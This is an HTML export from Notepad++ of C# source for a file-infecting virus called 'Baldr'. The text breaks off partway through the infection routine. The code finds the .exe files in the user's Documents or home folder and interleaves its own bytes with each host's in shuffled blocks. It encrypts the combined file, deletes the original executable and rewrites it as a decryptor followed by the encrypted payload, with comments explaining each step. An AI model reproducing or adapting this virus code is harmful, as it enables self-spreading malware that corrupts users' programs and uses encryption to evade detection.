<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc13 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Security</span><span class="sc10">.</span><span class="sc11">Cryptography</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">CSharp</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">CodeDom</span><span class="sc10">.</span><span class="sc11">Compiler</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Baldr</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Baldr</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">GetCurrentProcess</span><span class="sc10">().</span><span class="sc11">MainModule</span><span class="sc10">.</span><span class="sc11">FileName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">GetFolderPath</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">SpecialFolder</span><span class="sc10">.</span><span class="sc11">Personal</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">OSVersion</span><span class="sc10">).</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">).</span><span class="sc11">ToLower</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">arrShuffled</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">wordList</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Infect</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//if we are on linux 
</span><span class="sc0">            </span><span class="sc2">//like I was when building this using mono
</span><span class="sc0">            </span><span class="sc2">//we must change our slashes
</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"unix"</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc2">//grab all the exe files in the users
</span><span class="sc0">            </span><span class="sc2">//my documents folder or home folder in
</span><span class="sc0">            </span><span class="sc2">//unix 
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">myDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*.exe"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//read the host bytes and do a basic
</span><span class="sc0">                </span><span class="sc2">//byte check.
</span><span class="sc0">                </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">hostBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readBytes</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hostBytes</span><span class="sc10">[</span><span class="sc4">60</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">Infectfile</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">hostBytes</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Infectfile</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">hostByte</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//create our byte array for the virus
</span><span class="sc0">            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">myBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readBytes</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//generate a random 16 number
</span><span class="sc0">            </span><span class="sc2">//this will determine how many blocks
</span><span class="sc0">            </span><span class="sc2">//will be generated.
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RandSixTeen</span><span class="sc10">(</span><span class="sc11">hostByte</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//calculate how much to write each block
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hblocksize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hostByte</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vblocksize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">myBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// here we build a sequence into how our file will
</span><span class="sc0">            </span><span class="sc2">// be divided up. 
</span><span class="sc0">            </span><span class="sc2">// virus | host  | virus | host or
</span><span class="sc0">            </span><span class="sc2">// host  | virus | virus | host 
</span><span class="sc0">            </span><span class="sc2">// we need to figure out what order to sort
</span><span class="sc0">            </span><span class="sc2">// based on the total of blocks from
</span><span class="sc0">            </span><span class="sc2">// both files
</span><span class="sc0">            </span><span class="sc11">arrShuffled</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ShuffleArrayList</span><span class="sc10">((</span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">));</span><span class="sc0">

            </span><span class="sc2">//print out the arraylist order
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">enumr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arrShuffled</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">sequence</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">// 1 = virus
</span><span class="sc0">            </span><span class="sc2">// 0 = host
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">av</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ah</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//our counters that
</span><span class="sc0">            </span><span class="sc2">//will use below to keep
</span><span class="sc0">            </span><span class="sc2">//track
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ev</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">vblocksize</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">eh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">hblocksize</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">cmbName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">RandomWords</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fswHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">cmbName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Create</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">bwHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fswHost</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">enumr</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">())</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//based on our sequence we
</span><span class="sc0">                </span><span class="sc2">//will decide which to write
</span><span class="sc0">                </span><span class="sc2">//to join the files Equals(1) is the
</span><span class="sc0">                </span><span class="sc2">//virus bytes and 0 is host
</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">enumr</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">.</span><span class="sc11">Equals</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">av</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ev</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">bwHost</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">myBytes</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc2">//increment our block size to keep
</span><span class="sc0">                    </span><span class="sc2">//our starting and ending offsets
</span><span class="sc0">                    </span><span class="sc2">//so the next time we write we know
</span><span class="sc0">                    </span><span class="sc2">//where to start and end
</span><span class="sc0">                    </span><span class="sc11">av</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ev</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">ev</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ev</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vblocksize</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">//basically same deal as above
</span><span class="sc0">                    </span><span class="sc2">//but we have to do it seperatley
</span><span class="sc0">                    </span><span class="sc2">//to keep track of the hosts bytes
</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ah</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">eh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">bwHost</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">hostByte</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">ah</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">eh</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">eh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">eh</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hblocksize</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">sequence</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">enumr</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//always remember to flush!
</span><span class="sc0">            </span><span class="sc2">//before you close. This is good practice
</span><span class="sc0">            </span><span class="sc2">//and under the rare occasion will determine
</span><span class="sc0">            </span><span class="sc2">//if you write bytes or not.
</span><span class="sc0">
            </span><span class="sc11">fswHost</span><span class="sc10">.</span><span class="sc11">Flush</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">bwHost</span><span class="sc10">.</span><span class="sc11">Flush</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">bwHost</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fswHost</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">//Once we have the sequence combined into one file we will encrypt it
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rKey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RandomKey</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">encFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">EncryptFile</span><span class="sc10">(</span><span class="sc11">cmbName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rKey</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">encFile</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//if we generated our encrypted file based
</span><span class="sc0">                </span><span class="sc2">//on the combo file then we can go ahead and
</span><span class="sc0">                </span><span class="sc2">//remove it.
</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">cmbName</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">//setup the blocks
</span><span class="sc0">                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">block</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">fi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc11">encFile</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">encLength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc2">//generate our decryptor.
</span><span class="sc0">                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">decFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Decryptor</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sequence</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">block</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">myBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostByte</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">encLength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rKey</span><span class="sc10">);</span><span class="sc0">
                
                </span><span class="sc2">//check to make sure all our code compiled
</span><span class="sc0">                </span><span class="sc2">//and we got a file else abort.
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">decFile</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">

                    </span><span class="sc2">//read the decryptor bytes then delete
</span><span class="sc0">                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">decBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readBytes</span><span class="sc10">(</span><span class="sc11">decFile</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">decFile</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc2">//read the encrypted combined host + virus file
</span><span class="sc0">                    </span><span class="sc2">//then delete
</span><span class="sc0">                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">encBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readBytes</span><span class="sc10">(</span><span class="sc11">encFile</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">encFile</span><span class="sc10">);</span><span class="sc0">
                    
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">try</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc2">//delete the original file we are infecting
</span><span class="sc0">                            </span><span class="sc2">//we will then rebuild the file with our
</span><span class="sc0">                            </span><span class="sc2">//decryptor first and then the encrypted
</span><span class="sc0">                            </span><span class="sc2">//combined host + virus file
</span><span class="sc0">                            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">CreateNew</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">bwb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fsb</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">decBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">++)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc2">//write the decryptors bytes
</span><span class="sc0">                                </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">decBytes</span><span class="sc10">[</span><span class="sc11">x</span><span class="sc10">]);</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">encBytes</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc10">++)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc2">//write the encrypted bytes
</span><span class="sc0">                                </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">(</span><span class="sc11">encBytes</span><span class="sc10">[</span><span class="sc11">w</span><span class="sc10">]);</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc2">//flush and close
</span><span class="sc0">                            </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">Flush</span><span class="sc10">();</span><span class="sc0">
                            </span><span class="sc11">bwb</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                            </span><span class="sc11">fsb</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                            </span><span class="sc2">//if we are in unix we must chmod+x the
</span><span class="sc0">                            </span><span class="sc2">//file first to make it executable
</span><span class="sc0">                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">os</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"unix"</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc5">try</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">(</span><span class="sc6">"chmod +x "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">er</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc2">//uncomment for debugging this is a rare
</span><span class="sc0">                            </span><span class="sc2">//case but incase the file is locked we 
</span><span class="sc0">                            </span><span class="sc2">//won't be able to mainpulate it
</span><span class="sc0">
                            </span><span class="sc2">//Console.WriteLine("Error:" + er);
</span><span class="sc0">                            </span><span class="sc2">//Console.ReadLine();
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">//incase our decryptor didn't build
</span><span class="sc0">                    </span><span class="sc2">//or was deleted we will delete the
</span><span class="sc0">                    </span><span class="sc2">//encrypted combined file and do some
</span><span class="sc0">                    </span><span class="sc2">//clean up so we don't reinfect this
</span><span class="sc0">                    </span><span class="sc2">//file the next time.
</span><span class="sc0">
